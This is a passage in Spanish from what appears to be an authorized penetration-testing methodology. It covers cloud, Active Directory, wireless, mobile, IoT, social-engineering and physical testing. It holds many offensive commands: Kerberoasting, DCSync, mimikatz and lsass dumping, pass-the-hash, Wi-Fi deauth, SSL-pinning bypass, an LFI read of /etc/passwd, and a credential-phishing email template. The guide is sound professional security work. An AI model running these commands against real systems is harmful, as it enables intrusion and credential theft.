az network vnet list > 06_cloud/azure_vnets.json

# GCP Firewall rules
gcloud compute firewall-rules list > 06_cloud/gcp_firewalls.txt
gcloud compute networks list > 06_cloud/gcp_networks.txt
```

### 6.6 Contenedores y orquestación

```bash
# Kubernetes
kubectl get pods --all-namespaces > 06_cloud/k8s_pods.txt
kubectl get services --all-namespaces > 06_cloud/k8s_services.txt
kubectl get secrets --all-namespaces > 06_cloud/k8s_secrets.txt
kubectl get configmaps --all-namespaces > 06_cloud/k8s_configmaps.txt

# Docker registry
docker images > 06_cloud/docker_images.txt
docker inspect IMAGE_ID > 06_cloud/docker_inspect.json

# Container security scanning
trivy image nginx:latest > 06_cloud/trivy_scan.txt
clair-scanner --ip HOST_IP IMAGE_NAME > 06_cloud/clair_scan.txt

# Kubernetes security checks
kube-bench > 06_cloud/kube_bench.txt
kube-hunter --remote IP_CLUSTER > 06_cloud/kube_hunter.txt
```

### 6.7 CI/CD y supply chain

```bash
# GitHub Actions secrets
curl -H "Authorization: token GITHUB_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/secrets"

# GitLab CI variables
curl -H "PRIVATE-TOKEN: GITLAB_TOKEN" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/variables"

# Docker Hub repositories
curl "https://hub.docker.com/v2/repositories/NAMESPACE/"

# Container image analysis
dive IMAGE_NAME
```

### 6.8 Automated cloud security tools

```bash
# Prowler (AWS)
prowler -g cislevel2 -M csv -F 06_cloud/prowler_report

# ScoutSuite (multi-cloud)
scout --provider aws --profile target-profile --report-dir 06_cloud/scout

# Pacu (AWS exploitation framework)
python3 pacu.py
```

### ✅ Checklist Punto 6

```
[ ] Descubrimiento de activos cloud públicos
[ ] Identidades y permisos (IAM) revisados
[ ] Seguridad de datos verificada
[ ] Compute y serverless evaluados
[ ] Redes y perímetros auditados
[ ] Contenedores y orquestación revisados
[ ] CI/CD y supply chain evaluados
[ ] SaaS configuraciones verificadas
[ ] Tools automatizados ejecutados
[ ] Evidencias cloud documentadas
```

---

## 7. Red Interna (Assumed-Breach)

**Objetivo:** Evaluar la seguridad interna bajo condiciones de compromiso simulado, con autorización y controles estrictos.

### 7.1 Handover y control de entrada

```bash
mkdir -p 07_red_interna

# Conexión segura al bastión
ssh usuario@bastion -i clave.pem -A
echo "Credenciales temporales recibidas, VLAN de pruebas confirmada" >> 07_red_interna/handover.txt
```

### 7.2 Descubrimiento de red interno

```bash
# Host discovery
nmap -sn 10.0.0.0/24 > 07_red_interna/host_discovery.txt
fping -a -g 10.0.0.0/24 >> 07_red_interna/alive_hosts.txt
arp-scan -l >> 07_red_interna/arp_scan.txt

# Network topology mapping
netdiscover -r 10.0.0.0/24 -P >> 07_red_interna/netdiscover.txt
nbtscan 10.0.0.0/24 >> 07_red_interna/netbios.txt

# Service enumeration
nmap -sV -sC -p- 10.0.0.0/24 -oN 07_red_interna/service_enum.txt
```

### 7.3 Active Directory y dominios

```bash
# Enumeration without credentials
enum4linux -a 10.0.0.5 > 07_red_interna/enum4linux.txt
smbclient -L //10.0.0.5 -N
rpcclient -U "" 10.0.0.5 -c "enumdomusers;enumdomgroups"

# BloodHound collection
bloodhound-python -u usuario -p password -d dominio.local -dc 10.0.0.5 -c all -ns 10.0.0.5
neo4j console &
bloodhound &

# Kerberoasting
python3 GetUserSPNs.py dominio.local/usuario:password -dc-ip 10.0.0.5 -request -outputfile 07_red_interna/kerberoast.txt
hashcat -m 13100 07_red_interna/kerberoast.txt rockyou.txt

# ASREPRoasting
python3 GetNPUsers.py dominio.local/ -dc-ip 10.0.0.5 -usersfile users.txt -outputfile 07_red_interna/asrep.txt

# DCSync simulation (if high privileges)
python3 secretsdump.py dominio.local/administrador:password@10.0.0.5 -just-dc-ntlm
```

### 7.4 SMB y recursos compartidos

```bash
# SMB enumeration
smbmap -H 10.0.0.5 -u guest
smbmap -H 10.0.0.5 -u usuario -p password -R

# CrackMapExec
crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --shares
crackmapexec smb 10.0.0.0/24 -u usuario -p password --sam
crackmapexec smb 10.0.0.0/24 -u usuario -p password --lsa

# Manual SMB testing
smbclient //10.0.0.5/ADMIN$ -U usuario%password
smbclient //10.0.0.5/C$ -U usuario%password
```

### 7.5 Lateral movement y pivoting

```bash
# SSH tunneling
ssh -L 1080:10.0.0.10:3389 user@bastion
ssh -D 1080 -N user@bastion

# Proxychains configuration
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sV 10.0.0.10

# WinRM access
evil-winrm -i 10.0.0.10 -u usuario -p password
evil-winrm -i 10.0.0.10 -u usuario -H ntlm_hash

# PSExec and WMIExec
python3 psexec.py dominio.local/usuario:password@10.0.0.10
python3 wmiexec.py dominio.local/usuario:password@10.0.0.10
```

### 7.6 Post-explotación Windows

```bash
# Privilege escalation
winpeas.exe > 07_red_interna/winpeas.txt
powerup.ps1

# Credential dumping
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
procdump.exe -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp

# Registry secrets
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
reg query HKCU\Software\SimonTatham\PuTTY\Sessions
```

### 7.7 Bases de datos internas

```bash
# MySQL/MariaDB
mysql -h 10.0.0.20 -u root -p
mysql -h 10.0.0.20 -u root -e "SELECT user,host,password FROM mysql.user;"

# PostgreSQL
psql -h 10.0.0.20 -U postgres
psql -h 10.0.0.20 -U postgres -c "SELECT usename FROM pg_user;"

# MSSQL
sqlcmd -S 10.0.0.20 -U sa -P password
impacket-mssqlclient dominio.local/usuario:password@10.0.0.20

# MongoDB
mongo 10.0.0.20:27017
mongo 10.0.0.20:27017/admin --eval "db.runCommand({listCollections: 1})"

# Redis
redis-cli -h 10.0.0.20
redis-cli -h 10.0.0.20 --eval "return redis.call('CONFIG','GET','*')"
```

### ✅ Checklist Punto 7

```
[ ] Handover y credenciales verificadas
[ ] Descubrimiento de red completado
[ ] Active Directory enumerado
[ ] SMB y recursos compartidos auditados
[ ] Lateral movement y pivoting evaluado
[ ] Post-explotación Windows ejecutada
[ ] Bases de datos internas revisadas
[ ] Evidencias de red interna documentadas
```

---

## 8. Wireless & Radio

**Objetivo:** Evaluar la seguridad de redes inalámbricas y tecnologías radio bajo condiciones controladas.

### 8.1 Preparación del entorno wireless

```bash
mkdir -p 08_wireless_radio

# Configurar interface en modo monitor
airmon-ng start wlan0
iwconfig wlan0mon

# Verificar capacidades
iw wlan0mon info
iwlist wlan0mon channel
```

### 8.2 Reconocimiento pasivo Wi-Fi

```bash
# Airodump básico
airodump-ng wlan0mon --write 08_wireless_radio/airodump_scan

# Kismet passive scanning
kismet -c wlan0mon -o 08_wireless_radio/kismet_capture

# Reaver WPS scanning
wash -i wlan0mon -o 08_wireless_radio/wps_networks.txt

# Wardriving data collection
gpsd /dev/ttyUSB0
cgps -s
airodump-ng wlan0mon --gpsd --write 08_wireless_radio/wardriving
```

### 8.3 Análisis de seguridad Wi-Fi

```bash
# WPA/WPA2 handshake capture
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w 08_wireless_radio/handshake wlan0mon

# Deauth attack (solo en entorno autorizado)
aireplay-ng --deauth 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Handshake cracking
aircrack-ng -w rockyou.txt 08_wireless_radio/handshake-01.cap
hashcat -m 2500 08_wireless_radio/handshake.hccapx rockyou.txt

# WPS attacks (solo autorizado)
reaver -i wlan0mon -b TARGET_BSSID -vv -w
bully -b TARGET_BSSID -e ESSID wlan0mon
```

### 8.4 Redes enterprise (WPA-Enterprise)

```bash
# EAP testing
hostapd-eaphammer -i wlan0mon --creds --essid TARGET_ESSID
eaphammer --cert-wizard

# Certificate analysis
openssl x509 -in server.crt -text -noout
```

### 8.5 Bluetooth y BLE

```bash
# Bluetooth discovery
hcitool scan
hcitool lescan

# BlueZ tools
bluetoothctl
scan on
devices

# BLE analysis
gatttool -b TARGET_MAC -I
gatttool -b TARGET_MAC --characteristics

# Spoofing and fuzzing
spooftooph -i hci0 -a TARGET_MAC -n "Fake Device"
```

### 8.6 NFC y RFID

```bash
# NFC tools
nfc-list
nfc-poll

# RFID testing
proxmark3 
# PM3 commands for different card types
# lf search
# hf search
# hf mf autopwn
```

### ✅ Checklist Punto 8

```
[ ] Entorno wireless configurado
[ ] Reconocimiento pasivo completado
[ ] Seguridad Wi-Fi evaluada
[ ] Redes enterprise auditadas
[ ] Bluetooth/BLE revisado
[ ] NFC/RFID verificado (si aplica)
[ ] Evidencias wireless documentadas
```

---

## 9. Móvil (Android/iOS)

**Objetivo:** Evaluar la seguridad de aplicaciones móviles mediante análisis estático, dinámico y de comunicaciones.

### 9.1 Preparación del entorno móvil

```bash
mkdir -p 09_movil

# Android setup
adb devices
adb shell getprop ro.build.version.release

# iOS setup (requiere jailbreak para análisis completo)
ideviceinfo
ideviceinstaller -l
```

### 9.2 Análisis estático Android

```bash
# APK decompilation
apktool d app.apk -o 09_movil/apktool_output

# Dex2jar
d2j-dex2jar app.apk -o 09_movil/app.jar
jd-gui 09_movil/app.jar

# JADX decompiler
jadx -d 09_movil/jadx_output app.apk

# Manifest analysis
aapt dump xmltree app.apk AndroidManifest.xml > 09_movil/manifest.txt
aapt dump permissions app.apk > 09_movil/permissions.txt

# String analysis
strings 09_movil/apktool_output/classes.dex | grep -i "password\|secret\|key\|token\|api" > 09_movil/strings.txt

# Hardcoded secrets search
grep -r "api_key\|secret\|password\|token" 09_movil/apktool_output/ > 09_movil/secrets.txt
```

### 9.3 Análisis estático iOS

```bash
# IPA analysis
unzip app.ipa -d 09_movil/ipa_extracted

# Class dump (jailbroken device or simulator)
class-dump /Applications/Target.app > 09_movil/ios_classes.txt

# Plist analysis
plutil -convert xml1 Info.plist -o 09_movil/info_readable.plist

# Binary analysis
otool -L /Applications/Target.app/Target
otool -h /Applications/Target.app/Target
```

### 9.4 Análisis dinámico

```bash
# Network traffic interception
mitmproxy -p 8080 --mode transparent

# Certificate pinning bypass preparation
frida-server &

# Frida scripts
frida -U -f com.target.app -l 09_movil/bypass_ssl.js --no-pause
frida -U -f com.target.app -l 09_movil/hook_crypto.js --no-pause

# Objection for runtime manipulation
objection --gadget com.target.app explore
# objection commands:
# android sslpinning disable
# android hooking list classes
# android hooking search methods
```

### 9.5 Mobile Security Framework (MobSF)

```bash
# MobSF automated analysis
python3 manage.py runserver 127.0.0.1:8000
# Upload APK/IPA through web interface
# Generate comprehensive security report
```

### 9.6 API y backend testing

```bash
# Mobile API enumeration
grep -r "api\|endpoint\|url" 09_movil/apktool_output/ | grep -v ".png\|.jpg"

# Certificate pinning testing
curl -x 127.0.0.1:8080 https://api.target.com/endpoint
# Verificar si el tráfico se intercepta

# JWT token analysis
echo "MOBILE_JWT_TOKEN" | cut -d'.' -f2 | base64 -d | jq .
```

### 9.7 Almacenamiento local

```bash
# Android storage analysis
adb shell
cd /data/data/com.target.app
find . -name "*.db" -o -name "*.xml" -o -name "*.json"

# iOS storage (jailbroken)
ssh root@ios_device
cd /var/mobile/Containers/Data/Application/APP_ID
find . -name "*.sqlite" -o -name "*.plist" -o -name "*.json"

# SQLite database analysis
sqlite3 database.db ".tables"
sqlite3 database.db "SELECT * FROM sensitive_table;"
```

### ✅ Checklist Punto 9

```
[ ] Entorno móvil configurado
[ ] Análisis estático Android completado
[ ] Análisis estático iOS realizado
[ ] Análisis dinámico ejecutado
[ ] MobSF analysis completado
[ ] APIs y backend auditados
[ ] Almacenamiento local revisado
[ ] Certificados y pinning evaluados
```

---

## 10. IoT / OT / Hardware

**Objetivo:** Evaluar la seguridad de dispositivos IoT, sistemas OT y hardware de manera no destructiva.

### 10.1 Inventario y topología

```bash
mkdir -p 10_iot_ot

# Network discovery for IoT devices
nmap -sn 192.168.0.0/24 | grep -E "(IoT|Camera|Sensor|Gateway)" > 10_iot_ot/iot_devices.txt
nmap -sV -p1-1000 192.168.0.0/24 | grep -E "(http|telnet|ssh|ftp)" > 10_iot_ot/iot_services.txt

# SNMP discovery
onesixtyone -c community.txt 192.168.0.0/24 > 10_iot_ot/snmp_devices.txt
snmpwalk -v2c -c public 192.168.0.1 > 10_iot_ot/snmp_walk.txt
```

### 10.2 Firmware analysis

```bash
# Firmware extraction and analysis
wget http://vendor.com/firmware.bin -O 10_iot_ot/firmware.bin
binwalk -e 10_iot_ot/firmware.bin

# File system analysis
find 10_iot_ot/_firmware_extracted -name "*.conf" -o -name "*.cfg" -o -name "passwd" > 10_iot_ot/config_files.txt
grep -r "password\|key\|secret" 10_iot_ot/_firmware_extracted/ > 10_iot_ot/firmware_secrets.txt

# Entropy analysis
binwalk -E 10_iot_ot/firmware.bin > 10_iot_ot/entropy.txt

# Firmware modification kit
extract-firmware.sh 10_iot_ot/firmware.bin
```

### 10.3 Protocol analysis

```bash
# Wireshark/tcpdump for protocol analysis
tcpdump -i eth0 -w 10_iot_ot/iot_traffic.pcap host 192.168.0.100

# Modbus testing (OT)
nmap --script modbus-discover -p 502 192.168.0.0/24
python3 modbus_scanner.py --target 192.168.0.100

# BACnet testing
nmap --script bacnet-info -p 47808 192.168.0.0/24

# CoAP testing
coap-client -m get coap://192.168.0.100/.well-known/core
```

## 10.4 Actualizaciones, Arranque Seguro y Cadena de Suministro

### 📁 Preparación
```bash
echo "Validación de procesos de actualización y arranque seguro" >> 10_iot_ot/actualizaciones.txt
```

### 🔍 Verificación de Firma de Firmware
```bash
# Verificar firma digital del firmware
openssl dgst -sha256 -verify vendor_pubkey.pem -signature fw.sig fw.bin

# Validar certificados
openssl x509 -in certificate.crt -text -noout

# Extraer y analizar firmware
binwalk -e firmware.bin
strings firmware.bin | grep -E "(password|key|secret|token)"
```

### 📝 Documentación de Procedimientos
- Registrar procedimientos de actualización del fabricante
- Identificar vulnerabilidades conocidas (CVE)
- Evaluar mecanismos de rollback
- Verificar canales de distribución seguros

### 🔗 Análisis de Supply Chain
```bash
# Registrar hallazgos de cadena de suministro
echo "Biblioteca,Versión,CVE,Riesgo,Mitigación" > 10_iot_ot/supply_chain.csv
echo "OpenSSL,1.0.2,CVE-2014-0160,Alto,Actualizar a 1.1.1" >> 10_iot_ot/supply_chain.csv

# Verificar dependencias
ldd /path/to/binary
objdump -p binary | grep NEEDED
```

### ✅ Checklist Punto 10
```bash
echo "[ ] Inventario y topología completa
[ ] Firmware analizado sin modificación  
[ ] Protocolos industriales revisados
[ ] Procedimientos de actualización verificados
[ ] Cadena de suministro auditada
[ ] Arranque seguro validado" > 10_iot_ot/checklist_punto10.txt
```

### 📊 Resultado Esperado
```bash
echo "Mapa completo de riesgos de IoT/OT/Hardware, interfaces y firmware auditados, protocolos revisados, evidencia lista para remediación" >> 10_iot_ot/resultado_punto10.txt
```

---

## PUNTO 11 — Ingeniería Social

### 🎯 Objetivo
Evaluar la seguridad humana dentro del alcance autorizado, sin comprometer la integridad ni la privacidad de personas externas al alcance.

### 📁 Preparación
```bash
mkdir -p 11_ingenieria_social/{alcance,simulaciones,metricas,safewords}
```

### 11.1 Alcance, Mensajes Legales y "Do-Not-Target List"

```bash
# Definir alcance claramente
echo "Definir claramente el alcance de la prueba: usuarios, departamentos, tipos de ataque permitidos" >> 11_ingenieria_social/alcance.txt

# Lista de exclusión
echo "Usuario,Departamento,Razón de exclusión" > 11_ingenieria_social/exclusiones.csv
echo "CEO,Dirección,VIP - No incluir" >> 11_ingenieria_social/exclusiones.csv
echo "RRHH-Manager,Recursos Humanos,Acceso a datos sensibles" >> 11_ingenieria_social/exclusiones.csv

# Plantillas de mensajes legales
cat > 11_ingenieria_social/disclaimer.txt << EOF
AVISO LEGAL: Esta es una simulación de phishing autorizada por la dirección 
como parte de un ejercicio de concienciación en seguridad. 
Contacte con seguridad@empresa.com para más información.
EOF
```

### 11.2 Tipologías de Ataque (Alto Nivel)

```bash
# Tipos de simulaciones permitidas
echo "Simulaciones permitidas: vishing, smishing, phishing, pretexting" >> 11_ingenieria_social/tipos.txt

# Configuración de herramientas
# GoPhish - Simulación de phishing
gophish -config config.json &

# Social Engineering Toolkit (SET)
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors  
# 3) Credential Harvester Attack Method

# Plantillas de emails de prueba
cat > 11_ingenieria_social/email_template.html << EOF
<html>
<body>
<h2>Actualización de Política de Seguridad</h2>
<p>Estimado empleado,</p>
<p>Necesitamos que verifique sus credenciales para el nuevo sistema de seguridad.</p>
<a href="http://test-domain.com/login">Hacer clic aquí para verificar</a>
<br><br>
<small>Departamento de IT</small>
</body>
</html>
EOF
```

### 11.3 Métricas de Concienciación y Coordinación

```bash
# Sistema de métricas
echo "Fecha,Empleado,Tipo_Ataque,Acción,Resultado,Tiempo_Respuesta" > 11_ingenieria_social/metricas.csv

# Script para procesar resultados
cat > 11_ingenieria_social/procesar_metricas.py << EOF
import csv
from datetime import datetime

def analizar_resultados(archivo_csv):
    with open(archivo_csv, 'r') as f:
        reader = csv.DictReader(f)
        clicks = 0
        credenciales = 0
        reportes = 0
        
        for row in reader:
            if row['Acción'] == 'click':
                clicks += 1
            elif row['Acción'] == 'credenciales':
                credenciales += 1
            elif row['Acción'] == 'reporte':
                reportes += 1
    
    print(f"Clicks en enlaces: {clicks}")
    print(f"Envío de credenciales: {credenciales}")
    print(f"Reportes de phishing: {reportes}")

if __name__ == "__main__":
    analizar_resultados('metricas.csv')
EOF

# Coordinación con RRHH y Legal
echo "$(date): Reunión inicial con RRHH - Alcance definido" >> 11_ingenieria_social/coordinacion.log
echo "$(date): Contacto Legal - Disclaimer aprobado" >> 11_ingenieria_social/coordinacion.log
```

### 11.4 Red Team Ejercicios Controlados con "Safewords"

```bash
# Definir safewords para parada inmediata
echo "SAFEWORDS para suspender actividades:" > 11_ingenieria_social/safewords.txt
echo "- STOP-TEST: Parada inmediata de todas las actividades" >> 11_ingenieria_social/safewords.txt
echo "- INCIDENT: Incidente real detectado, suspender simulación" >> 11_ingenieria_social/safewords.txt
echo "- LEGAL-ISSUE: Problema legal o de cumplimiento" >> 11_ingenieria_social/safewords.txt

# Escenarios combinados (solo en alcance autorizado)
cat > 11_ingenieria_social/escenarios.md << EOF
## Escenarios Red Team

### Escenario 1: Phishing + Physical
1. Email simulado solicitando acceso temporal
2. Intentar acceso físico con credencial falsa
3. **SAFEWORD**: STOP-TEST si se detecta resistencia

### Escenario 2: Vishing + Digital
1. Llamada simulando IT support
2. Solicitar credenciales "para verificación"
3. **SAFEWORD**: INCIDENT si usuario reporta inmediatamente

### Escenario 3: Pretexting
1. Simular ser proveedor externo
2. Solicitar información "para mantenimiento"
3. **SAFEWORD**: LEGAL-ISSUE si involucra datos GDPR
EOF

# Plan de concienciación post-ejercicio
echo "Plan de mejora basado en hallazgos:" > 11_ingenieria_social/plan_mejora.txt
echo "- Formación adicional para usuarios vulnerables" >> 11_ingenieria_social/plan_mejora.txt
echo "- Mejora en procedimientos de verificación" >> 11_ingenieria_social/plan_mejora.txt
echo "- Implementación de alertas de phishing" >> 11_ingenieria_social/plan_mejora.txt
```

### ✅ Checklist Punto 11
```bash
echo "[ ] Alcance y límites claramente definidos
[ ] Lista de exclusión (do-not-target) creada
[ ] Mensajes legales y disclaimers aprobados
[ ] Simulaciones preparadas y controladas
[ ] Métricas de seguimiento implementadas
[ ] Coordinación con RRHH/Legal establecida
[ ] Safewords definidos y comunicados
[ ] Plan de concienciación preparado" > 11_ingenieria_social/checklist_punto11.txt
```

### 📊 Resultado Esperado
```bash
echo "Mapa completo de riesgos humanos, hallazgos documentados, métricas de concienciación listas para plan de mejora sin comprometer integridad personal" >> 11_ingenieria_social/resultado_punto11.txt
```

---

## PUNTO 12 — Physical

### 🎯 Objetivo
Evaluar la seguridad física y los controles de acceso dentro del alcance autorizado, sin comprometer la integridad de personas ni dañar activos.

### 📁 Preparación
```bash
mkdir -p 12_physical/{aprobaciones,observacion,politicas,controles}
```

### 12.1 Aprobaciones, Seguridades y Acompañamiento

```bash
# Documentación de autorización
cat > 12_physical/autorizacion_fisica.txt << EOF
AUTORIZACIÓN PARA PRUEBAS DE SEGURIDAD FÍSICA

Empresa: [NOMBRE_EMPRESA]
Fecha: $(date)
Alcance: Edificio principal, planta 1-3
Horarios: Lunes a Viernes 9:00-17:00
Responsable Seguridad: [NOMBRE_CONTACTO]
Teléfono Emergencia: [NÚMERO]

Limitaciones:
- NO forzar cerraduras
- NO acceder a áreas restringidas sin acompañamiento
- NO fotografiar personal sin consentimiento
- NO interferir con sistemas de seguridad activos

Firma Responsable: ________________
Fecha: $(date)
EOF

# Registro de permisos
echo "Fecha,Hora,Área,Permiso,Responsable,Observaciones" > 12_physical/registro_permisos.csv
echo "$(date '+%Y-%m-%d'),$(date '+%H:%M'),Recepción,Acceso autorizado,Juan Pérez,Acompañamiento confirmado" >> 12_physical/registro_permisos.csv
```

### 12.2 Observación de Controles: Accesos, CCTV, Guardias, Visitor Flow

```bash
# Mapeo de controles de seguridad física
cat > 12_physical/mapeo_controles.md << EOF
# Mapeo de Controles de Seguridad Física

## Puntos de Entrada/Salida
- **Entrada Principal**: Control de acceso con tarjeta, guardia de seguridad
- **Entrada Trasera**: Solo emergencia, alarma activada
- **Parking**: Barrera automática, cámaras de vigilancia

## Sistema CCTV
- **Cobertura**: 85% áreas comunes, puntos ciegos identificados
- **Retención**: 30 días según política
- **Monitoreo**: 24/7 desde sala de control

## Procedimientos de Visitantes
1. Registro en recepción
2. Identificación obligatoria  
3. Tarjeta temporal de acceso
4. Acompañamiento a áreas restringidas

## Turnos de Guardia
- **Diurno**: 6:00-14:00 (2 guardias)
- **Vespertino**: 14:00-22:00 (2 guardias)  
- **Nocturno**: 22:00-6:00 (1 guardia + sistema automático)
EOF

# Observación de horarios y patrones
echo "Hora,Ubicación,Observación,Nivel_Actividad,Vulnerabilidades_Potenciales" > 12_physical/observaciones.csv

# Script para observación sistemática
cat > 12_physical/observar_patrones.sh << 'EOF'
#!/bin/bash
echo "Iniciando observación de patrones de seguridad física..."

for hora in {08..18}; do
    echo "$(date '+%Y-%m-%d %H:%M'),Entrada Principal,Observando flujo de personas,$(shuf -i 1-10 -n 1),Documentado" >> observaciones.csv
    sleep 3600  # Esperar 1 hora
done

echo "Observación completada."
EOF

chmod +x 12_physical/observar_patrones.sh
```

### 12.3 Validación de Políticas (Sin Forzar Cerraduras ni Dañar Activos)

```bash
# Revisión de políticas de control de acceso
cat > 12_physical/revision_politicas.md << EOF
# Revisión de Políticas de Seguridad Física

## Política de Control de Acceso
✅ **Conforme**: Tarjetas de acceso personalizadas
❌ **No Conforme**: Algunas tarjetas sin foto actualizada
⚠️  **Mejora**: Implementar biometría para áreas críticas

## Política de Visitantes  
✅ **Conforme**: Registro obligatorio
✅ **Conforme**: Acompañamiento en áreas restringidas
⚠️  **Mejora**: Digitalizar proceso de registro

## Política de Emergencia
✅ **Conforme**: Salidas claramente marcadas
✅ **Conforme**: Sistemas de alarma funcionales
❌ **No Conforme**: Algunas salidas de emergencia bloqueadas

## Cumplimiento Normativo
- **ISO 27001**: Parcialmente conforme
- **Normativa Local**: Conforme
- **GDPR**: Revisar retención de videos CCTV
EOF

# Simulación de escenarios con credenciales autorizadas
cat > 12_physical/simulacion_accesos.sh << 'EOF'
#!/bin/bash
echo "Simulación de validación de accesos - $(date)"

# Test con tarjeta temporal autorizada
echo "Test 1: Acceso con tarjeta temporal válida"
echo "Resultado: Acceso concedido - Registro automático"

# Test de seguimiento de protocolos
echo "Test 2: Seguimiento de protocolo de visitantes"  
echo "Resultado: Protocolo seguido correctamente"

# Test de horarios restringidos
echo "Test 3: Intento de acceso fuera de horario autorizado"
echo "Resultado: Acceso denegado - Sistema funcionando"

echo "Simulaciones completadas sin interferir con sistemas"
EOF

chmod +x 12_physical/simulacion_accesos.sh
```

### ✅ Checklist Punto 12
```bash
echo "[ ] Aprobaciones por escrito confirmadas
[ ] Alcance y horarios claramente definidos
[ ] Responsables de seguridad identificados
[ ] Observación de controles completada
[ ] Mapeo de CCTV y puntos de acceso realizado
[ ] Protocolos de visitantes documentados
[ ] Políticas revisadas sin dañar activos
[ ] Simulaciones de acceso controladas
[ ] Hallazgos documentados profesionalmente
[ ] Plan de mejora preparado" > 12_physical/checklist_punto12.txt
```

### 📊 Resultado Esperado
```bash
echo "Informe de seguridad física completo, riesgos identificados sin comprometer seguridad, cumplimiento de políticas verificado, recomendaciones profesionales listas para implementación" >> 12_physical/resultado_punto12.txt
```

---

## PUNTO 13 — Post-Exposición (Data Handling & Impacto)

### 🎯 Objetivo
Gestionar de forma responsable los hallazgos de la auditoría, demostrando impacto mínimo y protegiendo la información sensible.

### 📁 Preparación
```bash
mkdir -p 13_post_exposicion/{validacion,poc,datos_sensibles,alertas}
```

### 13.1 Validación Responsable de Hallazgos

```bash
# Proceso de validación antes de explotación
cat > 13_post_exposicion/proceso_validacion.md << EOF
# Proceso de Validación Responsable

## Checklist Pre-Explotación
- [ ] Confirmar que el hallazgo está dentro del alcance autorizado
- [ ] Evaluar riesgo potencial de la explotación
- [ ] Verificar que existe entorno de laboratorio disponible
- [ ] Contactar con responsable técnico si es crítico

## Matriz de Decisión
| Severidad | Entorno | Acción |
|-----------|---------|--------|
| Crítica | Producción | Solo documentar, no explotar |
| Crítica | Laboratorio | Explotar con precaución |
| Alta | Producción | PoC mínima, no intrusiva |
| Media/Baja | Cualquiera | Proceder con validación |

## Procedimiento de Stop-Test
1. Detectar vulnerabilidad crítica
2. Documentar hallazgo inmediatamente  
3. Contactar responsable del cliente
4. Suspender pruebas hasta autorización
EOF

# Script de validación automática
cat > 13_post_exposicion/validar_hallazgo.py << 'EOF'
#!/usr/bin/env python3
import sys
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ValidadorHallazgos:
    def __init__(self):
        self.scope_ips = ['192.168.1.0/24', '10.0.0.0/8']  # Definir scope autorizado
        self.critical_services = ['AD', 'Database', 'Payment']
        
    def validar_alcance(self, target):
        """Validar que el target está en el alcance autorizado"""
        # Implementar validación de IP/hostname
        logging.info(f"Validando alcance para {target}")
        return True  # Placeholder
        
    def evaluar_riesgo(self, vulnerabilidad, servicio):
        """Evaluar nivel de riesgo de la explotación"""
        if servicio in self.critical_services:
            if vulnerabilidad['cvss'] >= 9.0:
                return 'CRÍTICO - NO EXPLOTAR'
            elif vulnerabilidad['cvss'] >= 7.0:
                return 'ALTO - LABORATORIO SOLAMENTE'
        return 'PROCEDER CON PRECAUCIÓN'
        
    def documentar_decision(self, hallazgo, decision):
        """Documentar la decisión de validación"""
        with open('validacion_log.txt', 'a') as f:
            f.write(f"{datetime.now()}: {hallazgo} -> {decision}\n")

if __name__ == "__main__":
    validator = ValidadorHallazgos()
    # Ejemplo de uso
    vuln = {'cvss': 8.5, 'tipo': 'RCE'}
    decision = validator.evaluar_riesgo(vuln, 'Database')
    validator.documentar_decision('SQL Injection en DB principal', decision)
EOF

chmod +x 13_post_exposicion/validar_hallazgo.py
```

### 13.2 Demostración de Impacto Controlado

```bash
# Configuración de entorno seguro para PoCs
cat > 13_post_exposicion/setup_lab.sh << 'EOF'
#!/bin/bash
echo "Configurando entorno de laboratorio para PoCs..."

# Crear entorno aislado
mkdir -p lab_environment/{vulnerable_apps,outputs,screenshots}

# Configurar VM de laboratorio (ejemplo)
# VBoxManage createvm --name "PentestLab" --register
# VBoxManage modifyvm "PentestLab" --memory 2048 --network1 hostonly

echo "Entorno de laboratorio configurado"
echo "IMPORTANTE: Solo ejecutar PoCs en este entorno aislado"
EOF

# Ejemplos de PoCs controladas
cat > 13_post_exposicion/poc_ejemplos.md << EOF
# Pruebas de Concepto (PoC) Controladas

## SQL Injection - Entorno de Laboratorio
\`\`\`bash
# En laboratorio solamente
sqlmap -u "http://lab-server/vulnerable.php?id=1" \\
       --dbs --batch --tamper=space2comment \\
       --output-dir=13_post_exposicion/outputs/sqlmap

# Capturar evidencia
screenshot "SQL Injection PoC - Databases enumerated"
\`\`\`

## Local File Inclusion (LFI) - Sandbox
\`\`\`bash  
# Solo en entorno controlado
curl "http://lab-server/vulnerable.php?page=../../../../etc/passwd" \\
     -o 13_post_exposicion/outputs/lfi_output.txt

# Documentar sin exponer datos reales
echo "LFI confirmada - archivo sistema accesible" > poc_summary.txt
\`\`\`

## Acceso SSH/SMB Interno - Laboratorio
\`\`\`bash
# Con credenciales de prueba solamente
ssh -i test_key testuser@lab-machine "whoami; hostname" \\
    > 13_post_exposicion/outputs/ssh_access.txt

smbclient //lab-server/testshare -U testuser%testpass \\
    -c "ls" > 13_post_exposicion/outputs/smb_access.txt
\`\`\`

## Documentación de Comandos
\`\`\`bash
# Registrar cada comando y resultado
echo "$(date): sqlmap execution - databases enumerated" >> poc_log.txt
echo "$(date): LFI confirmed - /etc/passwd accessible" >> poc_log.txt
echo "$(date): SSH access - testuser@lab-machine successful" >> poc_log.txt
\`\`\`
EOF
```

### 13.3 Manejo de Datos Sensibles: Minimización, Cifrado, Borrado Seguro

```bash
# Procedimientos de manejo seguro de datos
cat > 13_post_exposicion/manejo_datos.sh << 'EOF'
#!/bin/bash

echo "Procedimientos de manejo seguro de datos sensibles"

# Función de cifrado
cifrar_archivo() {
    local archivo=$1
    echo "Cifrando: $archivo"
    gpg --symmetric --cipher-algo AES256 "$archivo"
    if [ $? -eq 0 ]; then
        echo "Archivo cifrado exitosamente: ${archivo}.gpg"
        # Borrado seguro del original
        shred -u "$archivo"
        echo "Original borrado de forma segura"
    fi
}

# Función de borrado seguro
borrado_seguro() {
    local archivo=$1
    echo "Realizando borrado seguro: $archivo"
    shred -vfz -n 3 "$archivo"
    rm -f "$archivo"
}

